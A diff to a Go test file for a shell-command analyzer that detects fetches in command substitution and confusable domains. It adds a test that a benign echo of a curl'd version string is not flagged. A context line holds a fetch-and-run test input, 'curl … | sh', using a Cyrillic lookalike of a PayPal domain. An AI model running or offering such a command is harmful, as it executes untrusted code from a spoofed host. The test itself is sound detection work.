@@ -34,6 +34,16 @@ func TestAnalyzeDetectsFetchInCommandSubstitution(t *testing.T) {
 	}
 }
 
+func TestAnalyzeSkipsNonExecutingCommandSubstitution(t *testing.T) {
+	in := "echo \"$(curl -fsSL https://example.com/version.txt)\""
+	findings := Analyze(in)
+	for _, f := range findings {
+		if f.Kind == "fetch-in-command-substitution" {
+			t.Fatalf("did not expect fetch-in-command-substitution finding")
+		}
+	}
+}
+
 func TestAnalyzeIncludesPunycodeAndConfusableScore(t *testing.T) {
 	in := "curl https://раураl.com/install.sh | sh"
 	findings := Analyze(in)
